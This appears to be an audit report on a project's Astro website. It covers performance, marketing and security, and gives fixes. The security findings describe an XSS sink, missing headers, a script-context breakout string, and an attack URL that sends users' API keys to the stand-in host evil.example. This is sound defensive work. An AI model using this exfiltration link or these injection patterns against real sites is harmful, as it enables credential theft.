issues.evidence: astro.config.mjs: shikiConfig: { themes: { light: "vitesse-light", dark: "vitesse-light" } }. issues.evidence: BaseLayout.astro head (lines 24-53) contains no <link rel="preload" as="font">; the only blocking resource is /_astro/PageLayout.D8EWlqsA.css (42,879 B raw / 9,967 B gz) which carries the 16 @font-face rules (all font-display:swap, verified in built CSS). global.css @layer base sets h1,h2,h3 to Fraunces Variable and body to Inter Variable; the homepage hero terminal uses JetBrains Mono. So first paint uses Georgia/system fallbacks, then swaps - visible flash and layout shift on the exact LCP element. Worst-case font payload if all subsets trigger: ~280 KB; realistic latin-only: ~124 KB.

Optionally add size-adjust fallback @font-face metrics (fontaine, or manual) to kill swap reflow. Keep font-display:swap.
issues.title: No font preload and no size-adjusted fallbacks - guaranteed FOUT/reflow on the LCP heading

issues.evidence: astro.config.mjs defines site, integrations, markdown, redirects - no prefetch key. Pages are tiny (docs/quick-start 27,446 B raw / 5,638 B gz) so hover/viewport prefetch would make docs navigation feel instant at near-zero bandwidth cost. No ClientRouter/ViewTransitions either (grep confirmed), so no SPA-style transitions on docs browsing.
issues.fix: Add prefetch: true (hover/viewport default strategy) to astro.config.mjs. Defer ClientRouter/view transitions: the DocsLayout scroll-spy IntersectionObserver and Pagefind panel are not wired for swap semantics and ClientRouter adds ~13 KB JS to every page for little gain on a content site.
issues.title: No prefetch configured - docs navigation waits on full round-trips for 5-11 KB pages

issues.evidence: netlify.toml has a single [[headers]] block: for = "/_astro/*" with Cache-Control = "public, max-age=31536000, immutable". dist/pagefind/ contains content-addressed fragments plus the unhashed entry pagefind.js; og-image.png (48.6 KB) is fetched by every social scraper with no cache directive. Not a browser-perf regression, but repeat visits and crawler crawls revalidate unnecessarily.
issues.fix: Add [[headers]] blocks: for "/pagefind/*" -> public, max-age=31536000, immutable (fragments are hashed; pagefind.js is stable between builds - acceptable), and for "/og-image.png" -> public, max-age=604800. While in that file, add the missing security headers (CSP is a known gap) - same edit.
issues.title: netlify.toml caches only /_astro/* - /pagefind/* and /og-image.png get default TTL

issues.evidence: The site uses the low-level API (DocsLayout.astro imports /pagefind/pagefind.js and renders its own results panel), so dist/pagefind/pagefind-component-ui.js (175,488 B), pagefind-ui.js (119,987 B), pagefind-component-ui.css (43,339 B), pagefind-ui.css (14,482 B), pagefind-modular-ui.css (7,549 B) and pagefind-highlight.js (44,352 B) are never requested by any browser. Harmless at runtime but ~28% of the 2.0 MB artifact for zero benefit.

issues.title: ~450 KB of unused Pagefind UI assets shipped in the deploy artifact

issues.evidence: Homepage ships three blur-3xl gradient blobs, header backdrop-blur, an SVG with .ad-flow stroke-dasharray animation (CSS - correctly disabled under prefers-reduced-motion), and two SMIL <circle><animateMotion> token dots (dur=2s repeatCount=indefinite) that are NOT gated by reduced-motion and run forever on the marketing page. On low-end Android these keep the compositor/main thread warm during load, the main thing standing between the site and a flat 100 mobile Performance score.
issues.fix: Wrap the animateMotion circles in a reduced-motion check (Astro: render them conditionally is not possible statically - instead set <animateMotion> inside a <g> that CSS hides via @media (prefers-reduced-motion: reduce) { .ad-tokens { display:none } }), or swap SMIL for the same CSS dash technique already reduced-motion-gated. Consider dropping one blur-3xl blob.
issues.title: Always-on animations and blur layers on the homepage cost continuous paint work

The site owns the right words already (index h1 'Pool your GPUs.', features.ts FAQ: 'the layer that pools multiple machines into one logical accelerator') but expresses it only statically — TOP PLAY: build an interactive 'Cluster Planner / Will it run?' tool: pick devices you own, see estimated layer split (reusing ArchDiagram visuals), memory fit, and honest tokens/s RANGE. Nothing remotely like it exists on any competitor site, and it converts the core architecture into a 30-second aha.

Invite users to submit `distllm benchmark --json` output via PR to website-astro/src/data/community-results/, rendering a live 'real clusters' table (hardware combos nobody would guess: '3 laptops + desktop', 'mining-rig 3060s'). Competitors have nothing comparable — llama.cpp performance reports rot in GitHub threads. Pair with the fixed reproducibility story (issue #1) so submissions are verifiable.

Unique angle #3 (trust moat): the ONLY inference project whose benchmark suite ships inside the product — 'the same numbers we publish, generated by the engine itself' (features.ts). Ollama/vLLM/Petals/LocalAI publish no reproducible-perf pipeline tied to their sites. After issue #1 is fixed, amplify: render every published number from committed artifacts with date+SHA, and put a 'rerun it' one-liner beside each table.

Unique angle #4 (category inversion vs Petals): privacy as architecture, demonstrated by the playground itself. Petals' convenience (hosted swarm chat) costs them the privacy story ('Requests traverse volunteer nodes' — comparisons.astro). DistLLM's localhost-only playground is the mirror image; market the constraint AS the feature: 'This playground talks to YOUR server. Your prompts never leave your network.' Add that line to the playground header.

Unique angle #5 (training, positioned carefully): federated LoRA fine-tuning WITH differential privacy on consumer hardware (features.ts: gradient clipping + calibrated noise, round-versioned aggregation). Caution: Petals also supports distributed fine-tuning — never claim 'only inference engines don't train.' Differentiate precisely: private data never leaves each device, DP noise guarantees, and trained adapters served through the same OpenAI endpoint. With assumptions surfaced (issue #9) it becomes a linkable sales asset for homelab-to-SMB buyers — pair with the existing distllm-vs-cloud-costs.md blog post.

Sequencing recommendation: (1) benchmark truthfulness fix [Critical], (2) Cluster Planner, (3) social-proof band + Discord, (4) community results wall, (5) hardware-filtered model explorer, (6) Cmd+K + version banner, (7) playground meters, (8) Ollama/llama.cpp comparison rows. dimension: Security audit of website-astro (the site itself, not the product)

issues.evidence: D:\distributed-llm\website-astro\src\pages\changelog\index.astro:48 renders ``. In Astro content collections `entry.body` is the RAW markdown source string, not rendered HTML. Verified live against the preview: `curl -s http://localhost:4321/changelog/ | grep -oE '\*\*[^*]+\*\*'` returns literal `**disable**` — markdown formatting is broken AND any raw HTML in the .md source is injected verbatim into the DOM with zero sanitization. Every other collection path does this correctly (docs/[...slug].astro:14 and blog/[...slug].astro:12 both use `await render(entry)` + ``). Because the site ships NO CSP (see separate finding), there is no backstop: a single changelog entry pasted from external release notes or touched by a compromised tool/CI step containing e.g. `` executes on https://distllm.dev/changelog.
issues.fix: In changelog/index.astro replace the frontmatter body usage with the compiled component: `const { Content } = await render(entry);` per entry (or map with Promise.all), then `<Content />` inside the prose-doc div instead of `<Fragment set:html={entry.body} />`. This fixes the visible raw-markdown regression on /changelog/ and removes the injection sink in one change.
issues.title: Changelog index injects raw markdown source as unsanitized HTML via set:html (confirmed live rendering bug + XSS surface)

issues.evidence: `curl -sI http://localhost:4321/` returns only Vary/Content-Type/Cache-Control/Etag — no Content-Security-Policy, no X-Frame-Options, no X-Content-Type-Options, no Referrer-Policy, no Strict-Transport-Security. Production config D:\distributed-llm\website-astro\netlify.toml defines exactly ONE [[headers]] block (Cache-Control for /_astro/*); astro.config.mjs adds none. Concrete exploit chains this enables: (1) clickjacking of the playground Send button via transparent iframe; (2) Referrer leakage — the Share button (playground.ts:239-254) bakes `?base=<host>` into the URL, so a user arriving via such a link leaks that host to github.com/pypi.org when clicking outbound links, since no Referrer-Policy restricts it; (3) no script-src restriction means every XSS sink found in this audit executes unrestricted. Note: a strict connect-src will conflict with the playground's user-configured arbitrary base URLs — allowlist `'self' http://localhost:* http://127.0.0.1:*` plus document the constraint, or keep connect-src permissive while locking script-src/style-src/frame-ancestors/object-src.
issues.fix: Add a `_headers` file (or netlify.toml blocks) with: Content-Security-Policy `default-src 'self'; script-src 'self' https://plausible.io; style-src 'self'; img-src 'self' data:; connect-src 'self' http://localhost:* http://127.0.0.1:*; frame-ancestors 'none'; object-src 'none'; base-uri 'self'` (verified feasible: zero inline style= attributes in src/, all scripts are bundled except Plausible); Referrer-Policy `strict-origin-when-cross-origin`; X-Content-Type-Options `nosniff`; X-Frame-Options `DENY`; Strict-Transport-Security `max-age=63072000; includeSubDomains`. Also strip `?base/?model/...` params from the URL after hydration (history.replaceState already used in hydrateFromUrl) so shared-state doesn't sit in the address bar/referrer.
issues.title: Zero security headers in dev, preview, and production config (no CSP, no XFO, no nosniff, no Referrer-Policy, no HSTS)

issues.evidence: D:\distributed-llm\website-astro\src\scripts\playground.ts:50 `if (q.has("base")) { state.baseUrl = q.get("base")!; }` — no scheme/host validation. headers() (line 87) attaches `Authorization: Bearer ${state.apiKey}` to every request, and send() fetches `${state.baseUrl}/v1/chat/completions` (line 156). Attack: share `https://distllm.dev/playground?base=https%3A%2F%2Fevil.example` (framed as 'try my demo cluster'); victim opens it, the Base URL field is silently prefilled inside a collapsed <details>, victim pastes their API key and clicks Send — key + prompt contents go to the attacker's server. Amplifier: send() persists the value, `localStorage.setItem("pg-base-url", state.baseUrl)` (line 141), and line 25 reuses it on every future visit, so one click poisons later sessions too. The error message at lines 224-229 even coaches users toward typing keys for arbitrary hosts.
issues.fix: In hydrateFromUrl validate the param: parse with `new URL(v)`, require protocol http/https, show a persistent warning banner ('Requests will go to <non-localhost host> — not your machine') whenever the host is not localhost/127.0.0.1/*.lan; do not persist non-local bases to localStorage; clear the base param from the URL after first successful send. Consider defaulting the prefilled field to localhost always, requiring an explicit user edit to target anything else.
issues.title: Playground ?base= URL parameter redirects the Authorization header to an attacker-chosen host (API-key exfiltration vector)

issues.evidence: D:\distributed-llm\website-astro\src\layouts\BaseLayout.astro:47 `{jsonLdArray.map((obj) => (<script type="application/ld+json" set:html={JSON.stringify(obj)} />))}` lacks the recommended `.replace(/</g, '\\u003c')` escaping. Today jsonLd is only passed by index.astro:17 with hand-written constants (grep confirms no other callers), so nothing user-influenced reaches it. But the prop interface accepts arbitrary Record<string, unknown>, and the moment someone wires frontmatter titles/descriptions into JSON-LD (a common follow-up), a title containing `</script><script>…` becomes stored XSS in every layout head. Astro documents exactly this escaping requirement for set:html inside script tags.
issues.fix: One-line hardening in BaseLayout.astro: `set:html={JSON.stringify(obj).replace(/</g, "\\u003c")}`. Optionally add a build-time assertion that jsonLd values contain no '<'.
issues.title: JSON-LD injected via set:html without < escaping (latent script-context breakout)

issues.evidence: D:\distributed-llm\website-astro\src\layouts\DocsLayout.astro:150 `excerptEl.innerHTML = r.excerpt; // build-generated markup from our own index`. Pagefind excerpts are static build artifacts derived from indexed docs content; exploiting this requires compromising the build/index (at which point the attacker could edit pages directly), so it is defense-in-depth rather than a direct vector today — but the surrounding code is otherwise exemplary (title uses textContent at line 147 with an explicit comment, result URLs assigned via property). With a future community-contributions workflow for docs, or a supply-chain incident in the `pagefind` npm package (devDependency ^1.5.2), this sink turns live. Same-origin trust also covers `a.href = r.url` (line 143): a javascript: URL planted in the index would execute on click.
issues.fix: Either run r.excerpt through DOMPurify.sanitize() (small island-side dependency) before assignment, or parse it safely: set excerptEl.textContent = excerpt.replace(/<\/?mark>/g, '') and lose highlighting, or build the <mark> spans manually by splitting on the tags. Additionally force `a.rel = "noopener"` and reject hrefs not starting with '/' before assigning.
issues.title: Pagefind search excerpt assigned via innerHTML (acceptable today, fragile under threat-model drift)

issues.evidence: D:\distributed-llm\website-astro\src\pages\playground.astro:30 `<input data-pg="apiKey" type="password" placeholder="your-api-key" ...>` — correct element type and the value is never persisted (grep confirms the only localStorage key site-wide is `pg-base-url`, playground.ts:25/141). However, with no autocomplete attribute, Chrome/Safari will offer 'Save password' for distllm.dev when the form is submitted via the Send button; users who accept store a DistLLM API key in the browser's password vault keyed to the MARKETING domain — recoverable by any future XSS on the site via injected credential-form probing, and confusingly shared with any real site logins. There are no other forms on the site (grep for <form returns nothing).
issues.fix: Add `autocomplete="off"` (or `autocomplete="new-password"`, which suppresses save prompts more reliably) to the apiKey input. One attribute, closes the password-manager prompt.
issues.title: Playground API-key input lacks autocomplete suppression — browsers may offer to save the key as a site password
